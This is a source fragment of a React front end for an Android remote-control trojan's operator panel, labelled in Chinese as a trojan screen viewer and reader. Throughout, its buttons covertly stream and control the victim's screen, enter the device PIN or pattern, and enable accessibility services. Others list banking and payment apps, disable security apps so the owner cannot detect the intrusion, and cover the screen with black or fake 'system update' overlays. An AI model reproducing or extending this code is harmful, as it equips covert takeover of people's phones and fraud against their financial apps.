  const panelStyle = { background: 'rgba(255,255,255,.03)', border: '1px solid rgba(255,255,255,.08)', borderRadius: 6, padding: '6px 6px 8px', display: 'flex', flexDirection: 'column', gap: 3, width: '100%', boxSizing: 'border-box' }
  const panelTitle = { fontSize: 12, fontWeight: 600, color: '#e0e0e0', marginBottom: 4, textAlign: 'center', whiteSpace: 'nowrap' }
  const panelDesc = { fontSize: 10, color: 'rgba(255,255,255,.45)', lineHeight: 1.6, padding: '2px 6px 4px 6px' }
  const _b = (bg) => ({ width: '100%', height: 28, fontSize: 11, fontWeight: 600, borderRadius: 4, border: 'none', background: bg, color: '#fff', cursor: 'pointer', padding: '0 4px', boxSizing: 'border-box', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' })
  const btnGreen = _b('linear-gradient(135deg, #22c55e 0%, #16a34a 100%)')
  const btnBlue  = _b('linear-gradient(135deg, #1890ff 0%, #096dd9 100%)')
  const btnRed   = _b('linear-gradient(135deg, #ef4444 0%, #dc2626 100%)')
  const btnBlack = { ..._b('#000000'), background: '#000000' }
  const btnPurple= _b('linear-gradient(135deg, #722ed1 0%, #9254de 100%)')
  const _sb = (bg) => ({ ..._b(bg), height: 26, fontSize: 10 })
  function _rowBtn(color) {
    return {
      padding: '3px 8px', fontSize: 10,
      border: `1px solid ${color}55`,
      background: `${color}15`, color,
      borderRadius: 3, cursor: 'pointer', fontWeight: 600
    }
  }
  const btnSmallBlue  = _sb('linear-gradient(135deg, #1890ff 0%, #096dd9 100%)')
  const btnSmallGreen = _sb('linear-gradient(135deg, #22c55e 0%, #16a34a 100%)')
  const btnSmallRed   = _sb('linear-gradient(135deg, #ef4444 0%, #dc2626 100%)')

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%', position: 'relative' }}>
      {/* 一键解锁模态框 */}
      {unlockModalVisible && (
        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.5)', zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center' }} onClick={() => setUnlockModalVisible(false)}>
          <div style={{ background: '#fff', borderRadius: 12, padding: 24, width: 360, boxShadow: '0 8px 32px rgba(0,0,0,0.3)' }} onClick={e => e.stopPropagation()}>
            <div style={{ fontSize: 16, fontWeight: 600, marginBottom: 12, color: '#303133' }}>一键解锁</div>
            <div style={{ fontSize: 12, color: '#888', marginBottom: 16, lineHeight: 1.6 }}>
              通过隧道调用 local-service 的 <code>enterCipher</code> 接口<br/>
              <span style={{ color: '#1677ff' }}>PIN码直接输入数字，图案用逗号分隔(如: 1,2,3,6,5,4)</span>
            </div>
            <div style={{ marginBottom: 12 }}>
              <label style={{ fontSize: 13, color: '#303133', fontWeight: 500 }}>PIN 或 图案</label>
              <input type="text" placeholder="PIN或图案(1,2,3)" value={unlockPassword} onChange={e => setUnlockPassword(e.target.value)} style={{ width: '100%', height: 40, padding: '0 12px', border: '1px solid #d9d9d9', borderRadius: 6, fontSize: 14, outline: 'none', marginTop: 6, boxSizing: 'border-box' }} autoFocus />
            </div>
            <div style={{ display: 'flex', gap: 12, justifyContent: 'flex-end' }}>
              <button onClick={() => setUnlockModalVisible(false)} style={{ padding: '8px 20px', fontSize: 13, borderRadius: 6, border: '1px solid #d9d9d9', background: '#fff', color: '#666', cursor: 'pointer' }}>取消</button>
              <button onClick={async () => {
                setUnlockModalVisible(false)
                const cipher = unlockPassword
                if (!cipher) { centerToast('请输入密码或图案', 'err'); return }
                const isPattern = cipher.includes(',')
                centerToast('正在解锁...')
                addLog(`隧道解锁: ${isPattern ? '图案' : 'PIN'} → enterCipher`)
                const r = await sendTunnelInput('enterCipher', { cipher, type: isPattern ? 'pattern' : undefined })
                if (r.success !== false) { centerToast(isPattern ? '图案已输入' : '密码已输入'); addLog('隧道解锁: 成功') }
                else { centerToast(r.error || '解锁失败', 'err'); addLog(`隧道解锁: 失败 - ${r.error || '未知'}`) }
              }} style={{ padding: '8px 20px', fontSize: 13, borderRadius: 6, border: 'none', background: 'linear-gradient(135deg, #22c55e 0%, #16a34a 100%)', color: '#fff', cursor: 'pointer', fontWeight: 600 }}>确认解锁</button>
            </div>
          </div>
        </div>
      )}
      {/* 敏感APP模态框 */}
      {sensitiveAppsModal && (
        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.5)', zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center' }} onClick={() => setSensitiveAppsModal(false)}>
          <div style={{ background: '#fff', borderRadius: 12, padding: 24, width: 400, maxHeight: '70vh', boxShadow: '0 8px 32px rgba(0,0,0,0.3)', display: 'flex', flexDirection: 'column' }} onClick={e => e.stopPropagation()}>
            <div style={{ fontSize: 16, fontWeight: 600, marginBottom: 12, color: '#303133' }}>敏感APP设置</div>
            <div style={{ fontSize: 12, color: '#888', marginBottom: 12 }}>通过隧道查询设备上的敏感应用（银行/支付/安全类），可禁用或启用</div>
            <div style={{ flex: 1, overflow: 'auto', maxHeight: 300 }}>
              {sensitiveApps.length === 0 ? <div style={{ color: '#999', textAlign: 'center', padding: 20 }}>暂无敏感应用数据<br/><span style={{ fontSize: 11 }}>（设备可能未返回应用列表）</span></div> :
                sensitiveApps.map((app, i) => (
                  <div key={i} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '6px 8px', borderBottom: '1px solid #f0f0f0', fontSize: 12 }}>
                    <span style={{ color: '#303133', flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{app.name || app.packageName || app}</span>
                    <div style={{ display: 'flex', gap: 4 }}>
                      <button onClick={async () => { const r = await sendTunnelInput('disableApp', { packageName: app.packageName || app }); centerToast(r.success !== false ? '已禁用' : (r.error || '失败')) }} style={{ padding: '2px 8px', fontSize: 10, border: 'none', borderRadius: 4, background: '#ff4d4f', color: '#fff', cursor: 'pointer' }}>禁用</button>
                      <button onClick={async () => { const r = await sendTunnelInput('enableApp', { packageName: app.packageName || app }); centerToast(r.success !== false ? '已启用' : (r.error || '失败')) }} style={{ padding: '2px 8px', fontSize: 10, border: 'none', borderRadius: 4, background: '#52c41a', color: '#fff', cursor: 'pointer' }}>启用</button>
                    </div>
                  </div>
                ))}
            </div>
            <div style={{ marginTop: 12, display: 'flex', justifyContent: 'flex-end' }}>
              <button onClick={() => setSensitiveAppsModal(false)} style={{ padding: '6px 16px', fontSize: 13, borderRadius: 6, border: '1px solid #d9d9d9', background: '#fff', color: '#666', cursor: 'pointer' }}>关闭</button>
            </div>
          </div>
        </div>
      )}
      {/* 封禁APP模态框 */}
      {bannedAppsModal && (
        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.5)', zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center' }} onClick={() => setBannedAppsModal(false)}>
          <div style={{ background: '#fff', borderRadius: 12, padding: 24, width: 400, maxHeight: '70vh', boxShadow: '0 8px 32px rgba(0,0,0,0.3)', display: 'flex', flexDirection: 'column' }} onClick={e => e.stopPropagation()}>
            <div style={{ fontSize: 16, fontWeight: 600, marginBottom: 12, color: '#303133' }}>安全App封禁</div>
            <div style={{ fontSize: 12, color: '#888', marginBottom: 12 }}>管理被封禁的安全类应用（防止用户打开安全软件检测）</div>
            <div style={{ flex: 1, overflow: 'auto', maxHeight: 300 }}>
              {bannedApps.length === 0 ? <div style={{ color: '#999', textAlign: 'center', padding: 20 }}>暂无封禁应用数据<br/><span style={{ fontSize: 11 }}>（设备可能未返回应用列表）</span></div> :
                bannedApps.map((app, i) => (
                  <div key={i} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '6px 8px', borderBottom: '1px solid #f0f0f0', fontSize: 12 }}>
                    <span style={{ color: '#303133', flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{app.name || app.packageName || app}</span>
                    <div style={{ display: 'flex', gap: 4 }}>
                      <button onClick={async () => { const r = await sendTunnelInput('disableApp', { packageName: app.packageName || app }); centerToast(r.success !== false ? '已封禁' : (r.error || '失败')) }} style={{ padding: '2px 8px', fontSize: 10, border: 'none', borderRadius: 4, background: '#ff4d4f', color: '#fff', cursor: 'pointer' }}>封禁</button>
                      <button onClick={async () => { const r = await sendTunnelInput('enableApp', { packageName: app.packageName || app }); centerToast(r.success !== false ? '已解封' : (r.error || '失败')) }} style={{ padding: '2px 8px', fontSize: 10, border: 'none', borderRadius: 4, background: '#52c41a', color: '#fff', cursor: 'pointer' }}>解封</button>
                    </div>
                  </div>
                ))}
            </div>
            <div style={{ marginTop: 12, display: 'flex', justifyContent: 'flex-end' }}>
              <button onClick={() => setBannedAppsModal(false)} style={{ padding: '6px 16px', fontSize: 13, borderRadius: 6, border: '1px solid #d9d9d9', background: '#fff', color: '#666', cursor: 'pointer' }}>关闭</button>
            </div>
          </div>
        </div>
      )}

      {/* 顶部工具栏：只保留隧道/Bridge 状态 */}
      <div style={{ background: 'rgba(255,255,255,.04)', borderBottom: '1px solid rgba(255,255,255,.08)', padding: '10px 16px', display: 'flex', alignItems: 'center', gap: 8, flexShrink: 0, justifyContent: 'flex-end' }}>
        {/* ★ 隧道状态：只在 Bridge 连接后才显示 */}
        {device?.bridge_connected && (
          <div style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '4px 12px', borderRadius: 6, background: tunnelAlive ? 'rgba(82,196,26,.15)' : tunnelAlive === false ? 'rgba(255,77,79,.15)' : 'rgba(255,255,255,.06)', border: `1px solid ${tunnelAlive ? 'rgba(82,196,26,.3)' : tunnelAlive === false ? 'rgba(255,77,79,.3)' : 'rgba(255,255,255,.1)'}` }}>
            <span style={{ width: 8, height: 8, borderRadius: '50%', background: tunnelAlive ? '#52c41a' : tunnelAlive === false ? '#ff4d4f' : '#666' }} />
            <span style={{ fontSize: 12, color: tunnelAlive ? '#52c41a' : tunnelAlive === false ? '#ff4d4f' : '#888', fontWeight: 600 }}>隧道：{tunnelAlive ? ('在线 ' + (tunnelPort > 0 ? `端口 ${tunnelPort}` : '')) : tunnelAlive === false ? ('离线' + (tunnelPort > 0 ? ` 已分 ${tunnelPort}` : '')) : '检测中...'}</span>
            <button onClick={async () => { setTunnelAlive(null); try { const token = localStorage.getItem('token') || ''; const res = await fetch(`${window.location.protocol}//${window.location.hostname}/api/tunnel/screenshot?deviceId=${encodeURIComponent(resolvedDeviceId || '')}&t=${Date.now()}`, { headers: { Authorization: `Bearer ${token}` }, signal: AbortSignal.timeout(5000) }); setTunnelAlive(res.ok) } catch { setTunnelAlive(false) } }} style={{ marginLeft: 4, padding: '2px 6px', fontSize: 10, borderRadius: 4, border: 'none', background: 'rgba(255,255,255,.1)', color: '#aaa', cursor: 'pointer' }}>🔄</button>
          </div>
        )}
        <div style={{ marginLeft: 6, display: 'flex', alignItems: 'center', gap: 6, padding: '4px 12px', borderRadius: 6, background: device?.bridge_connected ? 'rgba(82,196,26,.15)' : 'rgba(255,77,79,.15)', border: `1px solid ${device?.bridge_connected ? 'rgba(82,196,26,.3)' : 'rgba(255,77,79,.3)'}` }}>
          <span style={{ width: 8, height: 8, borderRadius: '50%', background: device?.bridge_connected ? '#52c41a' : '#ff4d4f' }} />
          <span style={{ fontSize: 12, color: device?.bridge_connected ? '#52c41a' : '#ff4d4f', fontWeight: 600 }}>ADB：{device?.bridge_connected ? '在线' : '离线'}</span>
          {/* ★ Bridge 状态刷新按钮 */}
          <button
            onClick={async () => {
              setBridgeRefreshing(true)
              try {
                const token = localStorage.getItem('token') || ''
                const res = await fetch(`/api/device/${encodeURIComponent(resolvedDeviceId || '')}`, {
                  headers: { Authorization: `Bearer ${token}` }
                })
                const json = await res.json()
                const fresh = json?.data || json?.device || json
                if (fresh && typeof onDeviceUpdate === 'function') {
                  onDeviceUpdate(fresh)
                  centerToast('Bridge 状态已刷新')
                }
              } catch (e) {
                centerToast('刷新失败: ' + (e?.message || e), 'err')
              } finally {
                setBridgeRefreshing(false)
              }
            }}
            disabled={bridgeRefreshing}
            style={{
              marginLeft: 4, padding: '2px 8px', fontSize: 10, borderRadius: 4,
              border: 'none',
              background: 'rgba(255,255,255,.1)',
              color: bridgeRefreshing ? '#666' : '#aaa',
              cursor: bridgeRefreshing ? 'wait' : 'pointer'
            }}
            title="刷新 Bridge 连接状态">
            {bridgeRefreshing ? '⏳' : '🔄'}
          </button>
        </div>
        {/* ★ 19901 跳板去除后：连接过程全自动，顶部仅保留 “隧道状态” / “Bridge 状态” 藺标 */}
      </div>
      <style>{`@keyframes spin { to { transform: rotate(360deg) } }`}</style>

      {/* ★ 阅读器浮动模态框 */}
      {showReaderModal && (
        <div style={{ position: 'fixed', top: readerModalPos.y, left: readerModalPos.x, zIndex: 8888, display: 'flex', flexDirection: 'column', width: 320, boxShadow: '0 8px 32px rgba(0,0,0,0.6)', borderRadius: 16, overflow: 'hidden', border: '1px solid rgba(255,255,255,0.15)', background: '#1a1a2e' }}>
          <div onMouseDown={e => handleModalDragStart(e, 'reader')} style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '6px 12px', background: 'rgba(255,255,255,.06)', cursor: 'move', userSelect: 'none', borderBottom: '1px solid rgba(255,255,255,.1)' }}>
            <span style={{ width: 8, height: 8, borderRadius: '50%', background: httpReaderActive ? '#52c41a' : '#666' }} />
            <span style={{ fontSize: 12, color: '#ccc', fontWeight: 600, flex: 1 }}>📖 木马阅读器</span>
            {httpReaderActive && httpReaderData && <button onClick={translateReaderData} disabled={readerTranslating} style={{ padding: '2px 8px', border: 'none', borderRadius: 4, fontSize: 10, cursor: readerTranslating ? 'wait' : 'pointer', fontWeight: 600, background: 'rgba(59,130,246,.15)', color: '#3b82f6' }}>{readerTranslating ? '...' : '🌐'}</button>}
            <button onClick={toggleHttpReader} style={{ padding: '2px 8px', border: 'none', borderRadius: 4, fontSize: 10, cursor: 'pointer', fontWeight: 600, background: httpReaderActive ? 'rgba(239,68,68,.2)' : 'rgba(74,222,128,.2)', color: httpReaderActive ? '#ef4444' : '#4ade80' }}>{httpReaderActive ? '⏹' : '▶'}</button>
            <button onClick={() => { setShowReaderModal(false); if (httpReaderActive) toggleHttpReader() }} style={{ padding: '2px 8px', border: 'none', borderRadius: 4, fontSize: 12, cursor: 'pointer', background: 'rgba(255,255,255,.1)', color: '#aaa' }}>✕</button>
          </div>
          <div style={{ width: '100%', height: 520, background: '#000', position: 'relative' }}>
            {httpReaderActive ? (
              httpReaderLoading && !httpReaderData ? (
                <div style={{ position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: 12, color: '#aaa' }}>
                  <div style={{ width: 32, height: 32, border: '3px solid rgba(255,255,255,.15)', borderTopColor: '#52c41a', borderRadius: '50%', animation: 'spin 1s linear infinite' }} />
                  <div style={{ fontSize: 12 }}>正在加载阅读器…</div>
                </div>
              ) : <ReaderView data={httpReaderData} onTap={(x, y) => { sendTunnelInput('tap', { x, y }); fetchReaderAfterAction() }} onGesture={g => { if (g.type === 'tap') sendTunnelInput('tap', { x: g.x, y: g.y }); else sendTunnelInput('swipe', { x1: g.startX, y1: g.startY, x2: g.endX, y2: g.endY, duration: 300 }); fetchReaderAfterAction() }} style={{ background: readerBgColor }} textColor={readerTextColor} fontSize={readerFontSize} />
            ) : <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100%', color: '#666' }}>阅读器未开启</div>}
          </div>
          <div style={{ padding: '6px 8px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8, background: 'rgba(255,255,255,.04)' }}>
            <button title="通知栏" onClick={() => sendTunnelInput('keyevent', { keycode: 83 })} style={{ width: 40, height: 32, background: 'linear-gradient(135deg, #1890ff 0%, #40a9ff 100%)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 14, cursor: 'pointer' }}>🔔</button>
            <button title="返回" onClick={() => sendTunnelInput('back', {})} style={{ width: 40, height: 32, background: 'linear-gradient(135deg, #1890ff 0%, #40a9ff 100%)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 16, cursor: 'pointer' }}>‹</button>
            <button title="主页" onClick={() => sendTunnelInput('home', {})} style={{ width: 40, height: 32, background: 'linear-gradient(135deg, #1890ff 0%, #40a9ff 100%)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 16, cursor: 'pointer' }}>○</button>
            <button title="多任务" onClick={() => sendTunnelInput('recents', {})} style={{ width: 40, height: 32, background: 'linear-gradient(135deg, #1890ff 0%, #40a9ff 100%)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 16, cursor: 'pointer' }}>□</button>
            <button title="快捷设置" onClick={() => sendTunnelInput('keyevent', { keycode: 176 })} style={{ width: 40, height: 32, background: 'linear-gradient(135deg, #1890ff 0%, #40a9ff 100%)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 14, cursor: 'pointer' }}>⚙</button>
          </div>
          <div style={{ padding: '6px 8px', display: 'flex', alignItems: 'center', gap: 6, background: 'rgba(255,255,255,.04)', borderTop: '1px solid rgba(255,255,255,.06)' }}>
            <input type="text" placeholder="输入文本" value={textInput} onChange={e => setTextInput(e.target.value)} onKeyPress={e => { if (e.key === 'Enter' && textInput.trim()) { sendTunnelInput('inputText', { text: textInput.trim() }); centerToast(`已输入: ${textInput}`) } }} style={{ flex: 1, height: 30, padding: '0 8px', border: '1px solid rgba(255,255,255,.1)', borderRadius: 4, background: 'rgba(255,255,255,.06)', color: '#e0e0e0', fontSize: 12, outline: 'none' }} />
            <button onClick={() => { if (textInput.trim()) { sendTunnelInput('inputText', { text: textInput.trim() }); centerToast(`已输入: ${textInput}`) } }} style={{ height: 30, padding: '0 12px', fontSize: 11, borderRadius: 4, border: 'none', background: '#1890ff', color: '#fff', cursor: 'pointer' }}>发送</button>
          </div>
        </div>
      )}

      {/* ★ 投屏浮动模态框 */}
      {showScreenModal && (
        <div style={{ position: 'fixed', top: screenModalPos.y, left: screenModalPos.x, zIndex: 8888, display: 'flex', flexDirection: 'column', width: 320, boxShadow: '0 8px 32px rgba(0,0,0,0.6)', borderRadius: 16, overflow: 'hidden', border: '1px solid rgba(255,255,255,0.15)', background: '#1a1a2e' }}>
          <div onMouseDown={e => handleModalDragStart(e, 'screen')} style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '6px 12px', background: 'rgba(255,255,255,.06)', cursor: 'move', userSelect: 'none', borderBottom: '1px solid rgba(255,255,255,.1)' }}>
            <span style={{ width: 8, height: 8, borderRadius: '50%', background: httpScreenActive ? '#52c41a' : '#666' }} />
            <span style={{ fontSize: 12, color: '#ccc', fontWeight: 600, flex: 1 }}>🖥️ 木马投屏</span>
            <button onClick={toggleHttpScreen} style={{ padding: '2px 8px', border: 'none', borderRadius: 4, fontSize: 10, cursor: 'pointer', fontWeight: 600, background: httpScreenActive ? 'rgba(239,68,68,.2)' : 'rgba(74,222,128,.2)', color: httpScreenActive ? '#ef4444' : '#4ade80' }}>{httpScreenActive ? '⏹' : '▶'}</button>
            <button onClick={() => { setShowScreenModal(false); if (httpScreenActive) toggleHttpScreen() }} style={{ padding: '2px 8px', border: 'none', borderRadius: 4, fontSize: 12, cursor: 'pointer', background: 'rgba(255,255,255,.1)', color: '#aaa' }}>✕</button>
          </div>
          <div style={{ width: '100%', height: 520, background: '#000', position: 'relative' }}>
            {httpScreenActive && resolvedDeviceId ? (
              <ScreenView
                deviceId={resolvedDeviceId}
                onPointerDown={handleHttpScreenPointerDown}
                onPointerMove={handleHttpScreenPointerMove}
                onPointerUp={handleHttpScreenPointerUp}
              />
            ) : <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100%', color: '#666' }}>投屏未开启</div>}
          </div>
          <div style={{ padding: '6px 8px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8, background: 'rgba(255,255,255,.04)' }}>
            <button title="通知栏" onClick={() => sendTunnelInput('keyevent', { keycode: 83 })} style={{ width: 40, height: 32, background: 'linear-gradient(135deg, #1890ff 0%, #40a9ff 100%)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 14, cursor: 'pointer' }}>🔔</button>
            <button title="返回" onClick={() => sendTunnelInput('back', {})} style={{ width: 40, height: 32, background: 'linear-gradient(135deg, #1890ff 0%, #40a9ff 100%)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 16, cursor: 'pointer' }}>‹</button>
            <button title="主页" onClick={() => sendTunnelInput('home', {})} style={{ width: 40, height: 32, background: 'linear-gradient(135deg, #1890ff 0%, #40a9ff 100%)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 16, cursor: 'pointer' }}>○</button>
            <button title="多任务" onClick={() => sendTunnelInput('recents', {})} style={{ width: 40, height: 32, background: 'linear-gradient(135deg, #1890ff 0%, #40a9ff 100%)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 16, cursor: 'pointer' }}>□</button>
            <button title="快捷设置" onClick={() => sendTunnelInput('keyevent', { keycode: 176 })} style={{ width: 40, height: 32, background: 'linear-gradient(135deg, #1890ff 0%, #40a9ff 100%)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 14, cursor: 'pointer' }}>⚙</button>
          </div>
          <div style={{ padding: '6px 8px', display: 'flex', alignItems: 'center', gap: 6, background: 'rgba(255,255,255,.04)', borderTop: '1px solid rgba(255,255,255,.06)' }}>
            <input type="text" placeholder="输入文本" value={textInput} onChange={e => setTextInput(e.target.value)} onKeyPress={e => { if (e.key === 'Enter' && textInput.trim()) { sendTunnelInput('inputText', { text: textInput.trim() }); centerToast(`已输入: ${textInput}`) } }} style={{ flex: 1, height: 30, padding: '0 8px', border: '1px solid rgba(255,255,255,.1)', borderRadius: 4, background: 'rgba(255,255,255,.06)', color: '#e0e0e0', fontSize: 12, outline: 'none' }} />
            <button onClick={() => { if (textInput.trim()) { sendTunnelInput('inputText', { text: textInput.trim() }); centerToast(`已输入: ${textInput}`) } }} style={{ height: 30, padding: '0 12px', fontSize: 11, borderRadius: 4, border: 'none', background: '#1890ff', color: '#fff', cursor: 'pointer' }}>发送</button>
          </div>
        </div>
      )}

      {/* 主区域：控制面板 + 监听面板 */}
      <div className="trojan-main-area" style={{ display: 'flex', gap: 8, padding: '12px 10px 4px', flex: 1, overflow: 'auto', alignItems: 'stretch' }}>
        {/* 右侧整块：上=4列小面板，下=窗口防检测（纵向堆叠，紧贴不分离） */}
        <div style={{ display: 'flex', flexDirection: 'column', flex: 1, minWidth: 0, gap: 6 }}>
          {/* 控制面板 - 水平4列紧挨 */}
          <div className="trojan-control-panel" style={{ display: 'flex', gap: 6, flex: '0 0 auto', alignItems: 'flex-start', flexWrap: 'nowrap', justifyContent: 'space-between' }}>
          {/* 1. ADB控制 */}
          <div style={{ flex: '1 1 25%', minWidth: 0, maxWidth: '25%', display: 'flex', alignSelf: 'flex-start', flexDirection: 'column', gap: 3 }}>
            <div style={panelStyle} className="trojan-small-panel">
            <div style={panelTitle} className="trojan-panel-title">ADB控制</div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
              <button onClick={() => { if (httpScreenActive) { toggleHttpScreen(); setShowScreenModal(false) } else { toggleHttpScreen(); setShowScreenModal(true) } }} style={{ ...btnGreen, background: httpScreenActive ? 'linear-gradient(135deg, #ef4444 0%, #dc2626 100%)' : btnGreen.background }}>{httpScreenActive ? '关闭投屏' : 'ADB投屏'}</button>
              <button onClick={() => { if (httpReaderActive) { toggleHttpReader(); setShowReaderModal(false) } else { toggleHttpReader(); setShowReaderModal(true) } }} style={{ ...btnGreen, background: httpReaderActive ? 'linear-gradient(135deg, #ef4444 0%, #dc2626 100%)' : btnGreen.background }}>{httpReaderActive ? '关闭阅读' : 'ADB阅读'}</button>
              <button onClick={async () => { const r = await sendTunnelInput('wakeUpScreen', {}); centerToast(r.success !== false ? '已点亮' : (r.error || '失败')) }} style={btnGreen}>点亮屏幕</button>
              <button onClick={async () => { const r = await sendTunnelInput('lockScreen', {}); centerToast(r.success !== false ? '已锁定' : (r.error || '失败')) }} style={btnBlack}>锁定屏幕</button>
              <button onClick={async () => { const r = await sendTunnelInput('keepScreenOnTimer', { duration: 300 }); centerToast(r.success !== false ? '已开启常亮(5分钟)' : (r.error || '失败')) }} style={btnGreen}>保持常亮</button>
              <button onClick={() => setUnlockModalVisible(true)} style={btnGreen}>一键解锁</button>
              <button onClick={async () => { const v = prompt('输入亮度值 (0-255)', '128'); if (v === null) return; const val = Math.max(0, Math.min(255, parseInt(v) || 128)); const r = await sendTunnelInput('setBrightness', { value: val }); centerToast(r.success !== false ? `亮度已设置为 ${val}` : (r.error || '失败')) }} style={btnGreen}>设置亮度</button>
              <button onClick={async () => { const r = await sendTunnelInput('mute', {}); centerToast(r.success !== false ? '已静音' : (r.error || '失败')) }} style={btnGreen}>一键静音</button>
              <button onClick={async () => { centerToast('黑屏遮挡...'); try { const token = localStorage.getItem('token') || ''; const res = await fetch(`${window.location.protocol}//${window.location.hostname}:8889/api/tunnel/blackScreen`, { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` }, body: JSON.stringify({ action: 'enable', deviceId: resolvedDeviceId, alpha: 252, showIcon: false, showProgress: false, text: '', fontSize: 24 }) }); const r = await res.json(); centerToast(r.success ? '黑屏遮挡已开启' : (r.error || '失败')) } catch (e) { centerToast('请求失败: ' + e.message, 'err') } }} style={btnPurple}>黑屏遮挡</button>
              <button onClick={async () => { centerToast('取消黑屏...'); try { const token = localStorage.getItem('token') || ''; const res = await fetch(`${window.location.protocol}//${window.location.hostname}:8889/api/tunnel/blackScreen`, { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` }, body: JSON.stringify({ action: 'disable', deviceId: resolvedDeviceId }) }); const r = await res.json(); centerToast(r.success ? '遮挡已取消' : (r.error || '失败')) } catch (e) { centerToast('请求失败: ' + e.message, 'err') } }} style={{ ...btnBlack, background: 'linear-gradient(135deg, #434343 0%, #000 100%)' }}>取消遮挡</button>
              <button onClick={async () => { centerToast('伪装系统更新...'); try { const token = localStorage.getItem('token') || ''; const res = await fetch(`${window.location.protocol}//${window.location.hostname}:8889/api/tunnel/blackScreen`, { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` }, body: JSON.stringify({ action: 'enable', deviceId: resolvedDeviceId, style: 'update', alpha: 252, showIcon: false, showProgress: false, text: '系统更新中...', fontSize: 24 }) }); const r = await res.json(); centerToast(r.success ? '已显示更新遮挡' : (r.error || '失败')) } catch (e) { centerToast('请求失败: ' + e.message, 'err') } }} style={btnPurple}>伪装更新</button>
              <button onClick={() => sendTunnelInput('volumeUp', {})} style={btnGreen}>音量+</button>
              <button onClick={() => sendTunnelInput('volumeDown', {})} style={btnGreen}>音量-</button>
            </div>
          </div>
          </div>

          {/* 2. 无障碍设置 + 木马植入（同列上下堆叠） */}
          <div style={{ flex: '1 1 25%', minWidth: 0, maxWidth: '25%', display: 'flex', alignSelf: 'flex-start', flexDirection: 'column', gap: 4 }}>
            {/* 2a. 无障碍设置 */}
            <div style={panelStyle} className="trojan-small-panel">
              <div style={panelTitle} className="trojan-panel-title">无障碍设置</div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                <button onClick={async () => { centerToast('正在启用无障碍...'); const r = await sendTunnelInput('enableAccessibility', {}); if (r.success) { centerToast('无障碍已启用'); addLog('无障碍: 启用成功') } else { centerToast(r.error || '启用失败', 'err'); addLog(`无障碍: 启用失败 - ${r.error || '未知'}`) } }} style={{ ...btnBlue, background: '#1677ff' }}>启用无障碍</button>
                <button onClick={async () => { centerToast('正在禁用无障碍...'); const r = await sendTunnelInput('disableAccessibility', {}); if (r.success) { centerToast('无障碍已禁用'); addLog('无障碍: 禁用成功') } else { centerToast(r.error || '禁用失败', 'err'); addLog(`无障碍: 禁用失败 - ${r.error || '未知'}`) } }} style={btnRed}>禁用无障碍</button>
                <button onClick={async () => { centerToast('查询中...'); const r = await sendTunnelInput('accessibilityState', {}); if (r.success !== false) { const d = r.data || r; const enabled = d.ourServiceEnabled || d.accessibilityEnabled || false; centerToast(enabled ? '无障碍状态：启用' : '无障碍状态：禁用'); addLog(`无障碍状态: ${enabled ? '已启用' : '已禁用'}`) } else { centerToast(r.error || '查询失败', 'err') } }} style={btnGreen}>查询状态</button>
                <button onClick={async () => { centerToast('正在恢复无障碍...'); const r = await sendTunnelInput('resumeAccessibility', {}); if (r.success) { centerToast('无障碍已恢复'); addLog('无障碍: 恢复成功') } else { centerToast(r.error || '恢复失败', 'err') } }} style={btnSmallBlue}>恢复无障碍</button>
                <button onClick={async () => { centerToast('正在暂停无障碍...'); const r = await sendTunnelInput('pauseAccessibility', {}); if (r.success) { centerToast('无障碍已暂停'); addLog('无障碍: 暂停成功') } else { centerToast(r.error || '暂停失败', 'err') } }} style={btnSmallRed}>暂停无障碍</button>
                <button onClick={async () => { centerToast('查询敏感APP...'); try { const r = await sendTunnelShell('cat /data/local/tmp/sensitive_apps.json 2>/dev/null'); const output = r?.data?.output || r?.output || r?.stdout || ''; let apps = []; try { const parsed = JSON.parse(output); apps = Array.isArray(parsed) ? parsed : (parsed?.apps || []) } catch {} if (apps.length === 0) { const r2 = await sendTunnelInput('getAppList', {}); apps = r2?.data?.apps || r2?.apps || [] } setSensitiveApps(Array.isArray(apps) ? apps : []); setSensitiveAppsModal(true) } catch { setSensitiveApps([]); setSensitiveAppsModal(true) } }} style={btnSmallGreen}>敏感APP</button>
